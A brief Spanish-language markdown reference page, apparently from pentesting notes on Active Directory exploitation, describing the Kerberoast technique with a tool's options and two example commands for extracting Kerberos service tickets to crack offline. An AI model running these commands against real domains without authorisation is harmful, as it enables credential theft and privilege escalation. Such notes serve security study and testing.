### **Explotación de Active Directory/Kerberoast.md**

# Kerberoast

## Descripción

`Kerberoast` es una técnica de ataque utilizada para obtener tickets de servicio Kerberos de cuentas de servicio en entornos Active Directory. Estos tickets pueden ser crackeados fuera de línea para descubrir contraseñas de cuentas con privilegios elevados.

## Uso

```bash
kerberoast [opciones]
```

### Opciones principales

- `-u`, `--user`: Nombre de usuario para realizar el ataque.
- `-p`, `--password`: Contraseña del usuario.
- `-d`, `--domain`: Dominio objetivo.
- `--output`: Archivo de salida para los tickets obtenidos.
- `-h`, `--help`: Muestra la ayuda y opciones disponibles.

## Ejemplos

- Extraer tickets de servicio Kerberos:
  
  ```bash
  kerberoast.py -u usuario -p Contraseña123 -d ejemplo.com --output tickets.kirbi
  ```

- Realizar Kerberoasting con hashes NTLM:
  
  ```bash
  kerberoast.py -u usuario -H HASH_NTLM -d ejemplo.com --output tickets.kirbi
  ```

